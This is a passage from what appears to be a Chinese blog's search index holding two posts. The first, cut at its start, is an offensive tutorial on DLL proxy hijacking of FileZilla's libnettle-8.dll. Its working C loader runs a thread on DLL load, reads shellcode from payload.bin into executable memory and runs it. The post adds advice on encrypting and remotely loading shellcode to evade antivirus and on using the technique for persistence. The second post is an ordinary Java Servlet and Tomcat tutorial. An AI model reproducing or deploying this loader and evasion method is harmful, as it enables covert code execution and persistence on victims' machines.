&quot;/export:nettle_xts_decrypt_message=tmp2BF5.nettle_xts_decrypt_message,@475&quot;)#pragma comment(linker, &quot;/export:nettle_xts_encrypt_message=tmp2BF5.nettle_xts_encrypt_message,@476&quot;)#pragma comment(linker, &quot;/export:nettle_yarrow256_fast_reseed=tmp2BF5.nettle_yarrow256_fast_reseed,@477&quot;)#pragma comment(linker, &quot;/export:nettle_yarrow256_init=tmp2BF5.nettle_yarrow256_init,@478&quot;)#pragma comment(linker, &quot;/export:nettle_yarrow256_is_seeded=tmp2BF5.nettle_yarrow256_is_seeded,@479&quot;)#pragma comment(linker, &quot;/export:nettle_yarrow256_needed_sources=tmp2BF5.nettle_yarrow256_needed_sources,@480&quot;)#pragma comment(linker, &quot;/export:nettle_yarrow256_random=tmp2BF5.nettle_yarrow256_random,@481&quot;)#pragma comment(linker, &quot;/export:nettle_yarrow256_seed=tmp2BF5.nettle_yarrow256_seed,@482&quot;)#pragma comment(linker, &quot;/export:nettle_yarrow256_slow_reseed=tmp2BF5.nettle_yarrow256_slow_reseed,@483&quot;)#pragma comment(linker, &quot;/export:nettle_yarrow256_update=tmp2BF5.nettle_yarrow256_update,@484&quot;)#pragma comment(linker, &quot;/export:nettle_yarrow_key_event_estimate=tmp2BF5.nettle_yarrow_key_event_estimate,@485&quot;)#pragma comment(linker, &quot;/export:nettle_yarrow_key_event_init=tmp2BF5.nettle_yarrow_key_event_init,@486&quot;)DWORD WINAPI DoMagic(LPVOID lpParameter){ //https://stackoverflow.com/questions/14002954/c-programming-how-to-read-the-whole-file-contents-into-a-buffer FILE* fp; size_t size; unsigned char* buffer; fp = fopen(&quot;payload.bin&quot;, &quot;rb&quot;); fseek(fp, 0, SEEK_END); size = ftell(fp); fseek(fp, 0, SEEK_SET); buffer = (unsigned char*)malloc(size); //https://ired.team/offensive-security/code-injection-process-injection/loading-and-executing-shellcode-from-portable-executable-resources fread(buffer, size, 1, fp); void* exec = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE); memcpy(exec, buffer, size); ((void(*) ())exec)(); return 0;}BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved){ HANDLE threadHandle; switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: // https://gist.github.com/securitytube/c956348435cc90b8e1f7 // Create a thread and close the handle as we do not want to use it to wait for it threadHandle = CreateThread(NULL, 0, DoMagic, NULL, 0, NULL); CloseHandle(threadHandle); case DLL_THREAD_ATTACH: break; case DLL_THREAD_DETACH: break; case DLL_PROCESS_DETACH: break; } return TRUE;} Domagic函数从payload.bin中读取shellcode，之后使用virtualmalloc和malloc函数分配相应大小的内存空间，再将指针指向对应的空间执行shellcode 12345678910111213141516171819202122232425DWORD WINAPI DoMagic(LPVOID lpParameter){ //https://stackoverflow.com/questions/14002954/c-programming-how-to-read-the-whole-file-contents-into-a-buffer FILE* fp; size_t size; unsigned char* buffer; fp = fopen(&quot;payload.bin&quot;, &quot;rb&quot;); fseek(fp, 0, SEEK_END); size = ftell(fp); fseek(fp, 0, SEEK_SET); buffer = (unsigned char*)malloc(size); //https://ired.team/offensive-security/code-injection-process-injection/loading-and-executing-shellcode-from-portable-executable-resources fread(buffer, size, 1, fp); void* exec = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE); memcpy(exec, buffer, size); ((void(*) ())exec)(); return 0;} Dllmain函数为dll函数的入口 12345678910111213141516171819202122232425BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved){ HANDLE threadHandle; switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: // https://gist.github.com/securitytube/c956348435cc90b8e1f7 // Create a thread and close the handle as we do not want to use it to wait for it threadHandle = CreateThread(NULL, 0, DoMagic, NULL, 0, NULL); CloseHandle(threadHandle); case DLL_THREAD_ATTACH: break; case DLL_THREAD_DETACH: break; case DLL_PROCESS_DETACH: break; } return TRUE;} 原文章的原理如下图 A：fzsftp.exe B:tmp2BF5.dll(正常的libnettle-8.dll文件) C:恶意libnettle-8.dll E:payload.bin 存储shellcode 实际操作中用cs直接生成的shellcode已经被杀软识别，因此免杀效果很差，将shellcode分离后远程加载并进行加密后才可以实现免杀。在实战中可以根据目标机器上安装的软件生成dll文件并替换，实现权限维持 参考 https://cloud.tencent.com/developer/article/1739263 https://github.com/Flangvik/SharpDllProxy https://gist.github.com/securitytube/c956348435cc90b8e1f7","link":"/2020/12/06/DLL%E4%BB%A3%E7%90%86%E5%8A%A0%E8%BD%BDshellcode%E5%AE%9E%E8%B7%B5/"},{"title":"Servlet学习","text":"概念Servlet 1Java Servlet（Java服务器小程序）是一个基于Java技术的Web组件，运行在服务器端，它由Servlet容器所管理，用于生成动态的内容。 Servlet是平台独立的Java类，编写一个Servlet，实际上就是按照Servlet规范编写一个Java类。Servlet被编译为平台独立 的字节码，可以被动态地加载到支持Java技术的Web服务器中运行。 Servlet容器 1Servlet容器也叫做Servlet引擎，是Web服务器或应用程序服务器的一部分，用于在发送的请求和响应之上提供网络服务，解码基于 MIME的请求，格式化基于MIME的响应。Servlet没有main方法，不能独立运行，它必须被部署到Servlet容器中，由容器来实例化和调用 Servlet的方法（如doGet()和doPost()），Servlet容器在Servlet的生命周期内包容和管理Servlet。在JSP技术 推出后，管理和运行Servlet/JSP的容器也称为Web容器。 Tomcat 1234567Tomcat是一个免费的开放源代码的Servlet容器。Tomcat服务器接受客户请求并做出响应的过程如下，与上图类似：1）客户端（通常都是浏览器）访问Web服务器，发送HTTP请求。 2）Web服务器接收到请求后，传递给Servlet容器。 3）Servlet容器加载Servlet，产生Servlet实例后，向其传递表示请求和响应的对象。 4）Servlet实例使用请求对象得到客户端的请求信息，然后进行相应的处理。 5）Servlet实例将处理结果通过响应对象发送回客户端，容器负责确保响应正确送出，同时将控制返回给Web服务器。 tomcat目录结构123456bin，用于存放Tomcat的各种配置文件，比如，web.xml、server.xmllib，用于存放Tomcat服务器，和所有Web应用程序需要访问的JAR文件logs，用于存放Tomcat的日志文件temp，用于存放Tomcat运行时，产生的临时文件webapps，Web应用程序的主要发布目录，通常将要发布的应用程序放到这个目录下work，Tomcat的工作目录，JSP编译生成的Servlet源文件，和字节码文件放在这个目录下 idea tomcat部署过程https://blog.csdn.net/qq_28513801/article/details/92838236 servlet什么是servlet?本质上就是一个运行在web容器(web服务器中)的java类，tomcat是web容器中的一个。 作用： 1用于处理用户的请求并作出响应 servlet与普通的java程序的区别： 12341.本质上就是一个java类2.所有的servlet必须实现接口：Servlet3.运行Tomcat中，web容器中4.对用户的请求进行处理，并且做出响应 编写步骤： 1231.创建一个继承于HttpServlet的类（HttpServlet实现了Servlet接口）2.重写doGet或doPost方法，分别用来处理浏览器提交的get或post请求3.配置webapp/WEB-INF/web.xml 文件，配置Servlet 的访问地址。 配置Servlet写好的Serlvet保存在src目录中 1234567891011121314151617package com.example.myServlet;import javax.servlet.ServletException;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;import java.io.PrintWriter;public class DemoServlet extends HttpServlet { protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { resp.setContentType(&quot;text/html;charset=utf-8&quot;); PrintWriter writer=resp.getWriter(); writer.println(&quot;&lt;h1 style='color:red'&gt;11111&lt;/h1&gt;&quot;); }} 在WEB-INF/web.xml中配置servlet-mapping和servlet-name 访问效果 servlet生命周期一个servlet只会在tomcat容器中实例化一次，且只会产生一个对象，常驻内存，要等到服务器关闭才会销毁。tomcat对它做了多线程处理，这样才能实现一个对象多个请求 init： 1初始化方法，用户第1次访问的时候会执行1次 service ： 1处理服务请求的方法，每次请求都会执行 destory： 1销毁方法，服务器关闭的时候执行1次 继承Servlet类并重写三个方法 123456789101112131415161718192021222324252627282930313233package com.example.myServlet;import javax.servlet.*;import java.io.IOException;public class ServletDemo implements Servlet { @Override public void init(ServletConfig servletConfig) throws ServletException{ System.out.println(&quot;init&quot;); } @Override public ServletConfig getServletConfig(){ return null; } @Override public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException{ System.out.println(&quot;service&quot;); } @Override public String getServletInfo() { return null; } @Override public void destroy(){ System.out.println(&quot;destroy&quot;); }} 访问页面后，可以看到执行了service方法 ServletConfig接口在Servlet的配置文件web.xml中，可以使用一个或多个&lt;init-param&gt;标签为servlet配置一些初始化参数。 1234567891011121314151617&lt;servlet&gt; &lt;servlet-name&gt;mytest&lt;/servlet-name&gt; &lt;servlet-class&gt;com.example.myServlet.ConfigServlet&lt;/servlet-class&gt; &lt;init-param&gt; &lt;param-name&gt;name&lt;/param-name&gt; &lt;param-value&gt;admin&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;password&lt;/param-name&gt; &lt;param-value&gt;123456&lt;/param-value&gt; &lt;/init-param&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;mytest&lt;/servlet-name&gt; &lt;url-pattern&gt;/mytest&lt;/url-pattern&gt; &lt;/servlet-mapping&gt; getInitParameter(“参数”) 通过参数名，得到文件中参数值 getInitParameterNames() 得到所有参数名字 tomcat在创建Servlet实例时会自动把上面的初始化参数封装对ServletConfig对象中，并在调用init方法时，把ServletConfig对象传递给servlet。通过ServletConfig对象就可以得到当前servlet的初始化参数信息。 12345678910111213141516171819202122232425262728293031package com.example.myServlet;import javax.servlet.ServletException;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;import java.io.PrintWriter;import java.util.Enumeration;public class ConfigServlet extends HttpServlet { @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException{ resp.setContentType(&quot;text/html;charset=utf-8&quot;); PrintWriter writer=resp.getWriter(); String name=getInitParameter(&quot;name&quot;); writer.println(name); Enumeration initParameterNames=getInitParameterNames(); while (initParameterNames.hasMoreElements()){ String element= (String) initParameterNames.nextElement(); String value=getInitParameter(element); writer.println(&quot;参数名:&quot;+element+&quot;值:&quot;+value); } }} 成功获取到了配置的信息 HttpServletRequest 对象123456789101112131415161718192021222324package com.example.myServlet;import javax.servlet.ServletException;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;import java.io.PrintWriter;public class HttpServletRequestDemo extends HttpServlet { @Override protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException{ response.setContentType((&quot;text/html;charset=utf-8&quot;)); PrintWriter writer=response.getWriter(); writer.println(request.getMethod()); //请求方式 writer.println(request.getRequestURI()); //请求URL writer.println(request.getProtocol()); //请求协议 writer.println(request.getQueryString()); //查询字符 writer.println(request.getHeader(&quot;user-agent&quot;)); //获取UA }} 效果 BeanUtilsBeanUtils是apache commons 组件的成员之一，用于简化javaBean封装数据的操作。也就是说可以简化获取参数的方式 先导入包 123456789101112131415161718192021222324252627282930313233343536373839package com.example.myServlet;import org.apache.commons.beanutils.BeanUtils;import javax.servlet.ServletException;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;import java.io.PrintWriter;import java.lang.reflect.InvocationTargetException;import java.util.Map;class User{ private String name; private String sex; private int age;}public class HttpServletRequestDemo extends HttpServlet { @Override protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { response.setContentType((&quot;text/html;charset=utf-8&quot;)); PrintWriter writer = response.getWriter(); Map parameterMap = request.getParameterMap(); User user = new User(); try{ BeanUtils.populate(user,parameterMap); }catch (IllegalAccessException e){ e.printStackTrace(); }catch (InvocationTargetException e){ e.printStackTrace(); } writer.println(user); }} 作用域sevlet中的请求会根据作用域的范围分为请求域、会话域、上下文域 123请求域：一个用户的一次请求会话域：一个用户的所有请求上下文域：所有用户的所有请求 范围大小 1请求域 &lt; 会话域 &lt; 上下文域 作用域存值 1setAttritube(&quot;键&quot;，“值”) 取值 1getAttritube(&quot;键&quot;) 删除 1removeAttritube(&quot;键&quot;) 转发实现页面跳转，从一个servlet跳转到另一个servlet 123456789public class HttpServletRequestDemo extends HttpServlet { @Override protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { response.setContentType((&quot;text/html;charset=utf-8&quot;)); RequestDispatcher requestDispatcher=request.getRequestDispatcher(&quot;demo&quot;); requestDispatcher.forward(request,response); }} 跳转到demo 转发的特点： 12341.地址栏不会发生变化，显示的还是上一个servlet的地址2.一共只有一次请求：请求不断链3.请求域中数据不会丢失：还是要满足请求不断链。4.转发中，是一次请求的 重定向123456public class HttpServletRequestDemo extends HttpServlet { @Override protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { response.sendRedirect(&quot;demo&quot;); }} 效果 重定向的特点： 12341.地址栏：有变化，显示新的地址2.2次请求3.请求域中的数据：断链就数据丢失了4.重定向的根目录是：http://localhost:8080/不包含项目的访问地址 HttpServletResponse设置响应的状态码 1234567891011121314package com.example.myServlet;import javax.servlet.ServletException;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;public class ResponseDemo extends HttpServlet { protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { response.setStatus(200); }}","link":"/2021/05/23/Servlet%E5%AD%A6%E4%B9%A0/"}],"tags":[],"categories":[]}